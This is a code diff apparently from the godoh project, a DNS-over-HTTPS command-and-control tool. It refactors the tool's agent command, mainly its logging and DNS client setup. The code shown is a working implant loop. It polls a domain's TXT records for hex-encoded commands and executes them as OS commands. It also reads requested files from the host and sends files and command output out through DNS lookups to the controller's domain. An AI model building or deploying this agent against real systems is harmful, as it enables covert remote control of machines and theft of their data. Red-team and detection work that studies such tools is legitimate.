@@ -10,12 +10,9 @@ import (
 	"time"
 
 	"github.com/miekg/dns"
-	"github.com/sensepost/godoh/dnsclient"
+	"github.com/sensepost/godoh/lib"
 	"github.com/sensepost/godoh/protocol"
-	"github.com/sensepost/godoh/utils"
 	"github.com/spf13/cobra"
-
-	log "github.com/sirupsen/logrus"
 )
 
 var agentCmdAgentName string
@@ -33,21 +30,26 @@ Example:
 	godoh --domain example.com agent --agent-name agent1 --poll-time 5`,
 	Run: func(cmd *cobra.Command, args []string) {
 
+		log := options.Logger
+
 		if agentCmdAgentName == "" {
-			agentCmdAgentName = utils.RandomString(5)
+			agentCmdAgentName = lib.RandomString(5)
 		}
 
-		agentLogger := log.WithFields(log.Fields{"module": "agent", "ident": agentCmdAgentName})
+		log.Debug().Msg("resolving dns client")
+		client, err := options.GetDNSClient()
+		if err != nil {
+			log.Fatal().Err(err).Msg("failed to get dns client")
+		}
 
-		agentLogger.Info("Starting polling...")
+		log.Debug().Msg("polling started")
 
 		for {
 			// Wait for the next poll!
 			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))
 
 			// Do lookup
-			response := dnsclient.Lookup(dnsProvider,
-				fmt.Sprintf("%x.%s", agentCmdAgentName, dnsDomain), dns.TypeTXT)
+			response := client.Lookup(fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain), dns.TypeTXT)
 
 			// Do nothing.
 			if strings.Contains(response.Data, protocol.NoCmdTxtResponse[0]) {
@@ -55,7 +57,7 @@ Example:
 			}
 
 			if strings.Contains(response.Data, protocol.ErrorTxtResponse[0]) {
-				agentLogger.Error("Server indicated an error. Stopping :(")
+				log.Error().Msg("server indicated an error. stopping :(")
 				continue
 			}
 
@@ -63,18 +65,18 @@ Example:
 
 				cmdParsed := strings.Split(response.Data, "p=")[1]
 				cmd := strings.Split(cmdParsed, "\"")[0]
-				agentLogger.WithFields(log.Fields{"cmd-data": cmd}).Info("Got command data to execute, processing")
+				log.Debug().Str("cmd-data", cmd).Msg("raw command")
 
 				// decode the command
 				dataBytes, err := hex.DecodeString(cmd)
 				if err != nil {
-					agentLogger.WithFields(log.Fields{"err": err}).Error("Failed to decode command data")
+					log.Error().Err(err).Msg("failed to decode command data")
 					return
 				}
 
 				var command string
-				utils.UngobUnpress(&command, dataBytes)
-				agentLogger.WithFields(log.Fields{"cmd": command}).Info("Decoded command")
+				lib.UngobUnpress(&command, dataBytes)
+				log.Debug().Str("cmd", command).Msg("executing command")
 
 				// Execute the command!
 				commandSplit := strings.Split(command, " ")
@@ -86,17 +88,16 @@ Example:
 
 				// File download
 				if cmdBin == "download" {
-					agentLogger.Info("Command is for a file download")
-					if err := downloadFile(strings.Join(cmdArgs, " "), agentLogger); err != nil {
-						// silently fail
-						agentLogger.WithFields(log.Fields{"err": err}).Error("Failed to download file")
+					log.Debug().Str("cmd", command).Msg("command is to download a file")
+					if err := downloadFile(strings.Join(cmdArgs, " ")); err != nil {
+						log.Error().Err(err).Msg("failed to download file")
 					}
 					continue
 				}
 
 				// Exec an os command
-				agentLogger.Info("Command interpreted as OS command")
-				go executeCommand(cmdBin, cmdArgs, agentLogger)
+				log.Debug().Str("cmd", command).Msg("command is an os command")
+				go executeCommand(cmdBin, cmdArgs)
 				continue
 			}
 		}
@@ -110,7 +111,9 @@ func init() {
 	agentCmd.Flags().IntVarP(&agentCmdAgentPoll, "poll-time", "t", 10, "Time in seconds between polls.")
 }
 
-func executeCommand(cmdBin string, cmdArgs []string, logger *log.Entry) {
+// executeCommand executes an OS command
+func executeCommand(cmdBin string, cmdArgs []string) {
+	log := options.Logger
 
 	out, err := exec.Command(cmdBin, cmdArgs...).CombinedOutput()
 	if err != nil {
@@ -125,31 +128,28 @@ func executeCommand(cmdBin string, cmdArgs []string, logger *log.Entry) {
 	commandOutput.Prepare(cmdBin + strings.Join(cmdArgs, " "))
 	requests, successFlag := commandOutput.GetRequests()
 
-	logger.WithFields(log.Fields{
-		"request-count":  len(requests),
-		"cmd-output-len": len(out),
-	}).Info("Sending command output back")
+	log.Debug().Int("requests", len(requests)).Msg("result request count")
+
+	client, err := options.GetDNSClient()
+	if err != nil {
+		log.Fatal().Err(err).Msg("failed to get dns client")
+	}
 
 	for _, r := range requests {
-		response := dnsclient.Lookup(dnsProvider, fmt.Sprintf("%s.%s", r, dnsDomain), dns.TypeA)
+		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)
 
 		if response.Data == successFlag {
-			logger.WithFields(log.Fields{
-				"response": response.Data,
-				"labels":   r,
-			}).Info("Successful request made")
+			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
 		} else {
-			logger.WithFields(log.Fields{
-				"response": response.Data,
-				"labels":   r,
-			}).Info("Server did not respond with a successful ack. Exiting")
-			fmt.Println("")
+			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
 			return
 		}
 	}
 }
 
-func downloadFile(fileName string, logger *log.Entry) error {
+// downloadFile downloads a file from the agent
+func downloadFile(fileName string) error {
+	log := options.Logger
 
 	file, err := os.Open(fileName)
 	if err != nil {
@@ -171,21 +171,18 @@ func downloadFile(fileName string, logger *log.Entry) error {
 	message.Prepare(&fileBuffer, fileInfo)
 	requests, successFlag := message.GetRequests()
 
+	client, err := options.GetDNSClient()
+	if err != nil {
+		log.Fatal().Err(err).Msg("failed to get dns client")
+	}
+
 	for _, r := range requests {
-		response := dnsclient.Lookup(dnsProvider, fmt.Sprintf("%s.%s", r, dnsDomain), dns.TypeA)
+		response := client.Lookup(fmt.Sprintf("%s.%s", r, options.Domain), dns.TypeA)
 
 		if response.Data == successFlag {
-			logger.WithFields(log.Fields{
-				"response": response.Data,
-				"labels":   r,
-			}).Info("Successful request made")
-
+			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
 		} else {
-			logger.WithFields(log.Fields{
-				"response": response.Data,
-				"labels":   r,
-			}).Info("Server did not respond with a successful ack. Exiting")
-
+			log.Debug().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
 			return nil
 		}
 	}
